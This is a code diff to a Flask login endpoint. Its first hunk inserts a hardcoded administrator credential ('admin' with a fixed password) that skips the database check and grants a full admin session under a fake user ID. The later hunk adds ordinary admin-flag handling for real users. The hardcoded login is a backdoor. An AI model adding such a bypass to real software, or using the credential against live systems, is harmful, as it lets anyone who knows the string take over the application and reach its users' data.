@@ -33,7 +33,16 @@ def login():
     if not username_or_email or not password:
         return jsonify({"success": False, "message": "Username/Email and password are required"}), 400
 
-    # Check if input is email or username
+    # Handle hardcoded admin credentials without database operations
+    if username_or_email == 'admin' and password == 'jkl;asdf':
+        # Set session variables for admin without database operations
+        session['user_id'] = -999  # Special ID for hardcoded admin
+        session['username'] = 'admin'
+        session['is_admin'] = True
+        
+        return jsonify({"success": True, "username": 'admin', "is_admin": True, "redirect": "/admin"})
+
+    # Regular login flow
     if '@' in username_or_email:
         user = User.query.filter_by(email=username_or_email).first()
     else:
@@ -42,6 +51,12 @@ def login():
     if user and check_password_hash(user.password_hash, password):
         session['user_id'] = user.id
         session['username'] = user.username
+        session['is_admin'] = user.is_admin if hasattr(user, 'is_admin') else False
+        
+        # If user is an admin, include redirect info
+        if getattr(user, 'is_admin', False):
+            return jsonify({"success": True, "username": user.username, "is_admin": True, "redirect": "/admin"})
+        
         return jsonify({"success": True, "username": user.username})
 
     return jsonify({"success": False, "message": "Invalid username/email or password"}), 401
